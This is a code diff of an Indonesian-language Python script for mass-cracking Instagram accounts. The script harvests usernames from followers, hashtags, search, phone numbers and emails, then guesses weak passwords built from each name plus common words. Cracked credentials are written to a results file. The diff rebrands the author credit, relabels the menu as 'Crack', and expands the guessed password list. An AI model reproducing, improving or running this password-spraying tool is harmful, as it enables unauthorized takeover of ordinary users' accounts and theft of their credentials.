@@ -19,16 +19,14 @@ ___logo___ = (f"""{H} ___ ___ ___ __  __ ___ _   _ __  __
 {B}|  _/   / _|| |\/| || || |_| | |\/| |
 {B}|_| |_|_\___|_|  |_|___|\___/|_|  |_|
 {K}[{P}•{K}]{P}——————————————————————————————
-{H}[{P}>{H}]{P} Au : rozhak
-{H}[{P}>{H}]{P} Ig : @rozhak_official
-{H}[{P}>{H}]{P} Fb : fb.com/rozhak.xyz
+{H}[{P}>{H}]{P} Ig : okamahendraa__
 {K}[{P}•{K}]{P}——————————————————————————————
 """)
 # Login Cookie
 def ___login___():
     os.system('clear')
     print(___logo___)
-    print(f"{B}[{P}•{B}]{P} Masukan Cookie Instagram, Sebaiknya Jangan Gunakan Akun Yang Baru Di Buat, Kalau Anda Belum Mengetahui Cara Mendapatkan Cookie Instagram Ketik {M}[{P}Open{M}]{P}\n")
+    print(f"{B}[{P}•{B}]{P} Masukan Cookie Instagram{M}[{P}Open{M}]{P}\n")
     ___cookie = input(f"{H}[{P}?{H}]{P} Cookie :{K} ")
     if ___cookie in ['open', 'Open', 'OPEN']:
         print(f"{K}[{P}!{K}]{P} Anda Akan Diarahkan Ke Youtube, Silahkan Ikuti Cara Untuk Mendapatkan Cookie...");sleep(3);os.system('xdg-open https://youtu.be/u17ZQgSs3aY');exit()
@@ -75,17 +73,17 @@ def ___menu___():
         print(f"{P}[{M}!{P}]{M} Cookie Invalid");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(3);___login___()
     except (IOError):
         exit(f"{P}[{K}!{P}]{K} Koneksi Error")
-    print(f"{B}[{P}1{B}]{P} Dump Username Dari Mengikuti")
-    print(f"{B}[{P}2{B}]{P} Dump Username Dari Pengikut")
-    print(f"{B}[{P}3{B}]{P} Dump Username Dari Activity")
-    print(f"{B}[{P}4{B}]{P} Dump Username Dari Beranda")
-    print(f"{B}[{P}5{B}]{P} Dump Username Dari Hastag")
-    print(f"{B}[{P}6{B}]{P} Dump Username Dari Search")
-    print(f"{B}[{P}7{B}]{P} Dump Username Dari Query")
-    print(f"{B}[{P}8{B}]{P} Dump User Dari Email")
-    print(f"{B}[{P}9{B}]{P} Mulai Crack {P}[{H}Fast{P}]{H}")
-    print(f"{B}[{P}0{B}]{P} Lihat Hasil Crack")
-    print(f"{B}[{P}A{B}]{P} Keluar {P}[{M}Exit{P}]{M}\n")
+    print(f"{B}[{P}1{B}]{H} Crack Username Dari Mengikuti")
+    print(f"{B}[{P}2{B}]{H} Crack Username Dari Pengikut")
+    print(f"{B}[{P}3{B}]{H} Crack Username Dari Activity")
+    print(f"{B}[{P}4{B}]{H} Crack Username Dari Beranda")
+    print(f"{B}[{P}5{B}]{H} Crack Username Dari Hastag")
+    print(f"{B}[{P}6{B}]{H} Crack Username Dari Search")
+    print(f"{B}[{P}7{B}]{H} Crack Username Dari No Hp")
+    print(f"{B}[{P}8{B}]{H} Crack User Dari Email")
+    print(f"{B}[{P}9{B}]{H} Mulai Crack {P}[{H}Fast{P}]{H}")
+    print(f"{B}[{P}0{B}]{H} Lihat Hasil Crack")
+    print(f"{B}[{P}A{B}]{H} Keluar {P}[{M}Exit{P}]{M}\n")
     ___pilih = input(f"{H}[{P}?{H}]{P} Pilih :{K} ")
     if ___pilih in ['1','01']:
         ___mengikuti___()
@@ -312,7 +310,7 @@ class ___crack___:
         self.cp = []
         print(f"\n{H}[{P}1{H}]{P} Gunakan Password {H}[{K}nama, nama123, nama12345{H}]{K}")
         print(f"{H}[{P}2{H}]{P} Gunakan Password {H}[{K}nama, nama123, nama1234, nama12345{H}]{K}")
-        print(f"{H}[{P}3{H}]{P} Gunakan Password {H}[{K}nama, nama123, nama1234, nama12345, nama123456{H}]{K}")
+        print(f"{H}[{P}3{H}]{P} Gunakan Password {H}[{K}nama, nama123, nama1234, nama12345, nama123456, @@nama123, @@nama123456, @@nama12345, jakarta123, jakarta12345, jakarta123456, bali123, bali12345, instagram123, instagram12345, password123, password12345, newpassword, medan123, yogyakarta123{H}]{K}")
         print(f"{H}[{P}4{H}]{P} Gunakan Password Manual {H}[{K}>5{H}]{K}\n")
         ___pilih = input(f"{B}[{P}?{B}]{P} Pilih :{H} ")
         if ___pilih in ['4','04']:
@@ -380,7 +378,6 @@ class ___crack___:
                         print(f"{B}[{P}>{B}]{P} Password :{H} {pw}")
                         print(f"{B}[{P}>{B}]{P} Follower :{H} {follower}")
                         print(f"{B}[{P}>{B}]{P} Following :{H} {following}")
-                        print(f"{B}[{P}>{B}]{P} Cookie :{H} {coki}\n")
                         self.ok.append(f"{uid}|{pw}")
                         open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                         break
